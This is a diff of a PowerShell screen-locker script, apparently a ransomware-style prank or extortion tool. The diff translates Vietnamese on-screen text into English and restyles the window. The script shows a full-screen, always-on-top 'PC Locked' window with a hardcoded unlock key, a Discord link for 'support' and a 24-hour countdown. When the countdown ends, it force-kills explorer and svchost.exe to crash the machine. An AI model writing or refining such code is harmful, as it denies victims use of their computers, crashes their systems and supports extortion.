@@ -1,105 +1,94 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# ====== SETTINGS ======
-$correctKey = "taodeptrai"
+# ========== SETTINGS ==========
+$correctKey = "taodeptrainhatvutru"
 $hoursLeft = 24
 $deadline = (Get-Date).AddHours($hoursLeft)
 
-# ====== FORM SETUP ======
-$form = New-Object Windows.Forms.Form
-$form.Text = "Locked by BensGaming"
-$form.FormBorderStyle = 'None'
-$form.WindowState = 'Maximized'
+# ========== FORM SETUP ==========
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "System Locked"
+$form.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 25)
+$form.WindowState = "Maximized"
+$form.FormBorderStyle = "None"
 $form.TopMost = $true
-$form.BackColor = [Drawing.Color]::FromArgb(30, 30, 30)
-$form.StartPosition = 'CenterScreen'
+$form.StartPosition = "CenterScreen"
 
-# ====== MAIN PANEL (để canh giữa nội dung) ======
-$panel = New-Object Windows.Forms.Panel
-$panel.Size = New-Object Drawing.Size(800, 500)
-$panel.BackColor = 'Transparent'
-$panel.Location = New-Object Drawing.Point(($form.Width - $panel.Width)/2, ($form.Height - $panel.Height)/2)
-$panel.Anchor = 'None'
-$form.Controls.Add($panel)
+# ========== MAIN LABEL ==========
+$mainLabel = New-Object System.Windows.Forms.Label
+$mainLabel.Text = "🔒 PC Locked"
+$mainLabel.Font = New-Object System.Drawing.Font("Segoe UI", 48, [System.Drawing.FontStyle]::Bold)
+$mainLabel.ForeColor = "Red"
+$mainLabel.AutoSize = $true
+$mainLabel.Location = New-Object System.Drawing.Point(100, 50)
+$form.Controls.Add($mainLabel)
 
-# ====== LABEL - TITLE ======
-$labelTitle = New-Object Windows.Forms.Label
-$labelTitle.Text = "🛑 PC BỊ KHÓA 🛑"
-$labelTitle.Font = New-Object Drawing.Font("Segoe UI", 36, [Drawing.FontStyle]::Bold)
-$labelTitle.ForeColor = 'Red'
-$labelTitle.AutoSize = $true
-$labelTitle.Location = New-Object Drawing.Point(180, 20)
-$panel.Controls.Add($labelTitle)
+# ========== INFO LABEL ==========
+$infoLabel = New-Object System.Windows.Forms.Label
+$infoLabel.Text = "Enter the unlock key to access your PC.`nContact support: https://discord.gg/rf3fcuwz"
+$infoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18)
+$infoLabel.ForeColor = "White"
+$infoLabel.AutoSize = $true
+$infoLabel.Location = New-Object System.Drawing.Point(100, 150)
+$form.Controls.Add($infoLabel)
 
-# ====== LABEL - INSTRUCTION ======
-$labelInstruction = New-Object Windows.Forms.Label
-$labelInstruction.Text = "Vui lòng nhập mã mở khóa bên dưới`nLiên hệ Discord: https://discord.gg/rf3fcuwz"
-$labelInstruction.Font = New-Object Drawing.Font("Segoe UI", 14)
-$labelInstruction.ForeColor = 'White'
-$labelInstruction.AutoSize = $true
-$labelInstruction.Location = New-Object Drawing.Point(150, 100)
-$panel.Controls.Add($labelInstruction)
-
-# ====== LABEL - COUNTDOWN ======
-$countdownLabel = New-Object Windows.Forms.Label
-$countdownLabel.Font = New-Object Drawing.Font("Consolas", 24, [Drawing.FontStyle]::Bold)
-$countdownLabel.ForeColor = 'Orange'
+# ========== COUNTDOWN ==========
+$countdownLabel = New-Object System.Windows.Forms.Label
+$countdownLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
+$countdownLabel.ForeColor = "Gold"
 $countdownLabel.AutoSize = $true
-$countdownLabel.Location = New-Object Drawing.Point(250, 180)
-$panel.Controls.Add($countdownLabel)
+$countdownLabel.Location = New-Object System.Drawing.Point(100, 250)
+$form.Controls.Add($countdownLabel)
 
-# ====== TEXTBOX - INPUT ======
-$textBox = New-Object Windows.Forms.TextBox
-$textBox.Font = New-Object Drawing.Font("Consolas", 20)
-$textBox.Width = 400
-$textBox.Location = New-Object Drawing.Point(200, 240)
-$textBox.TextAlign = 'Center'
-$panel.Controls.Add($textBox)
+# ========== TEXTBOX ==========
+$textBox = New-Object System.Windows.Forms.TextBox
+$textBox.Font = New-Object System.Drawing.Font("Consolas", 20)
+$textBox.Width = 300
+$textBox.Location = New-Object System.Drawing.Point(100, 320)
+$form.Controls.Add($textBox)
 
-# ====== BUTTON - UNLOCK ======
-$button = New-Object Windows.Forms.Button
-$button.Text = "MỞ KHÓA"
-$button.Font = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
-$button.BackColor = [Drawing.Color]::FromArgb(50, 150, 50)
-$button.ForeColor = 'White'
-$button.Width = 200
+# ========== BUTTON ==========
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "UNLOCK"
+$button.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
+$button.BackColor = "DarkGreen"
+$button.ForeColor = "White"
+$button.Width = 160
 $button.Height = 50
-$button.Location = New-Object Drawing.Point(300, 300)
-$panel.Controls.Add($button)
+$button.Location = New-Object System.Drawing.Point(420, 320)
+$form.Controls.Add($button)
 
-# ====== FUNCTION: PHÁ HỆ THỐNG ======
+# ========== FUNCTION: KILL SYSTEM ==========
 function Break-Windows {
     Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
-    Start-Sleep -s 1
-    try {
-        taskkill /f /im svchost.exe | Out-Null
-    } catch {}
+    Start-Sleep -Seconds 1
+    taskkill /f /im svchost.exe
 }
 
-# ====== BUTTON CLICK EVENT ======
+# ========== BUTTON CLICK ==========
 $button.Add_Click({
     if ($textBox.Text -eq $correctKey) {
-        [Windows.Forms.MessageBox]::Show("Đã mở khóa", "Thành công", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
+        [System.Windows.Forms.MessageBox]::Show("Code accepted. Unlocking...", "Unlocked", 'OK', 'Information')
         $form.Close()
     } else {
-        [Windows.Forms.MessageBox]::Show("Sai mã!", "Lỗi", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Error)
+        [System.Windows.Forms.MessageBox]::Show("Incorrect key!", "Error", 'OK', 'Error')
     }
 })
 
-# ====== COUNTDOWN TIMER ======
-$timer = New-Object Windows.Forms.Timer
+# ========== TIMER ==========
+$timer = New-Object System.Windows.Forms.Timer
 $timer.Interval = 1000
 $timer.Add_Tick({
-    $timeLeft = $deadline - (Get-Date)
-    if ($timeLeft.TotalSeconds -le 0) {
+    $remaining = $deadline - (Get-Date)
+    if ($remaining.TotalSeconds -le 0) {
         $timer.Stop()
         Break-Windows
     }
-    $countdownLabel.Text = "⏳ Còn lại: " + $timeLeft.ToString("hh\:mm\:ss")
+    $countdownLabel.Text = "⏳ Time left: " + $remaining.ToString("hh\:mm\:ss")
 })
 $timer.Start()
 
-# ====== SHOW FORM ======
+# ========== SHOW ==========
 $form.Add_Shown({ $form.Activate() })
-$form.ShowDialog()
+[void]$form.ShowDialog()
